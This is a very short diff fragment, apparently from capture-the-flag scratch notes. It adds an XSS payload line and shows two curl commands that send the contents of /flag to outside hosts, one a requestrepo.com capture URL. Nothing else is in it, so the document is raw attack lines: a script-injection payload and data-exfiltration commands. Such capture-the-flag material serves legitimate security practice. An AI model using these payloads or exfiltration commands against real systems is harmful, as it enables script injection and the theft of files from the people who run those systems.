@@ -1,3 +1,5 @@
+<style onload=alert("xss")></style>
+
 curl -d @/flag http://???
 curl -F f=@/flag https://fybn2asz.requestrepo.com/
 
